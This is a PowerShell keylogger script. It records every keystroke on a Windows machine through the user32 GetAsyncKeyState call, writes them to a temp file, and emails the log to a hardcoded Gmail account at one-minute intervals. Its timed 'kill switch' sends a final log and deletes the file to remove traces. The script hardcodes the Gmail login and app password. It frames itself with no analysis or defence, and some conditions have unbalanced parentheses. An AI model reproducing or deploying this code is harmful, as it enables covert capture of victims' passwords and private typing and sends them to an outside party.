# Define variables for email, timing configuration, and kill switch timer
$logFile = "$env:TEMP\keylog.txt"
$emailIntervalMinutes = 1  # How often to email the log in minutes (adjustable)
$killSwitchTimeMinutes = 2  # Time in minutes after which the keylogger will stop (adjustable)
$killSwitchTriggered = $false  # Flag to track if kill switch has been triggered

# Setup email function
function Send-Email {
    param($logFilePath)
    
    Write-Host "Sending email..."  # Debug message
    
    # Define SMTP server and credentials (use Gmail in this case)
    $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587)
    $SMTPInfo.EnableSsl = $true
    $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('akeydeys@gmail.com', 'rvjf zsza yxfo gfwd')  # Gmail credentials
    
    $ReportEmail = New-Object System.Net.Mail.MailMessage
    $ReportEmail.From = 'akeydeys@gmail.com'
    $ReportEmail.To.Add('akeydeys@gmail.com')
    $ReportEmail.Subject = "Keylog Update"
    $ReportEmail.Body = "Attached is the keylog data."
    $ReportEmail.Attachments.Add($logFilePath)
    
    try {
        # Send email
        $SMTPInfo.Send($ReportEmail)
        Write-Host "Email sent successfully!"  # Debug message
    } catch {
        Write-Host "Failed to send email: $_"  # Debug message in case of failure
    }
}

# Run keylogger loop
function Start-KeyLogger {
    # Fix Add-Type with proper C# syntax (no space before closing @")
    Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

public class KeyLogger {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern short GetAsyncKeyState(int vKey);
}
'@ -Language CSharp

    $startTime = Get-Date
    $lastSent = $startTime
    $keyPresses = ""

    while ($true) {
        # Capture key presses
        for ($i = 1; $i -lt 255; $i++) {
            if ([KeyLogger]::GetAsyncKeyState($i) -ne 0) {
                $keyPresses += [char]$i
            }
        }

        # Write the log to file every 5 seconds
        if ($keyPresses.Length -gt 0) {
            Add-Content -Path $logFile -Value $keyPresses
            $keyPresses = ""
        }

        # Email logs at intervals
        if ((Get-Date) - $lastSent).TotalMinutes -ge $emailIntervalMinutes) {
            Send-Email -logFilePath $logFile
            $lastSent = Get-Date
        }

        # Check if kill switch time has been reached
        if ((Get-Date) - $startTime).TotalMinutes -ge $killSwitchTimeMinutes -and !$killSwitchTriggered {
            $killSwitchTriggered = $true
            # Kill switch triggered - send final log and remove traces
            Send-Email -logFilePath $logFile
            Remove-Item $logFile -Force
            Remove-Item "$env:TEMP\killSwitch.txt" -Force  # Remove any potential leftover killSwitch file
            Write-Host "Kill switch triggered, exiting..."  # Debug message
            Exit
        }

        # Sleep to reduce CPU usage
        Start-Sleep -Milliseconds 100
    }
}

# Start the keylogger in hidden mode
Write-Host "Starting keylogger..."  # Debug message
Start-KeyLogger
